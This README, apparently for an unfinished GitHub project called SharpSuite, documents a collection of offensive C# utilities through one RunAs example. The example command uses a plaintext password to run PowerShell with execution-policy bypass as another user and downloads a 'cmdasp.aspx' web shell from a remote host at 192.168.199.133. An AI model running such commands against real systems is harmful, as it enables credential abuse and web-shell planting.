# SharpSuite

SharpSuite is a collection of offensive C# utilities.

> Note: This is in the making!

# Utilities

This section will have an example of each utility.

## RunAs

`RunAs` lets you run a command as another user.

Here's an example:

```powershell
PS C:\Users\Public\Documents> .\RunAs.exe /user:LazyUser2 /pass:'LazyAdminPwd123!' /cmd:'powershell -ep bypass IWR -Uri http://192.168.199.133:9998/cmdasp.aspx -OutFile C:\Users\Public\cmdasp.aspx'
```

The file was created as the user named `LazyUser2`:

```powershell
PS C:\Users\Public\Documents> Get-Acl C:\Users\Public\cmdasp.aspx | Format-Table -Wrap


    Directory: C:\Users\Public


Path        Owner                     Access                                                                           
----        -----                     ------                                                                           
cmdasp.aspx DESKTOP-E2HUJDU\LazyUser2 BUILTIN\Administrators Allow  FullControl                                        
                                      DESKTOP-E2HUJDU\LazyUser2 Allow  FullControl                                     
                                      NT AUTHORITY\SYSTEM Allow  FullControl                                           
                                      NT AUTHORITY\INTERACTIVE Allow  DeleteSubdirectoriesAndFiles, Modify, Synchronize
                                      NT AUTHORITY\SERVICE Allow  DeleteSubdirectoriesAndFiles, Modify, Synchronize    
                                      NT AUTHORITY\BATCH Allow  DeleteSubdirectoriesAndFiles, Modify, Synchronize  
```

# ToDo

- [ ] Add more tools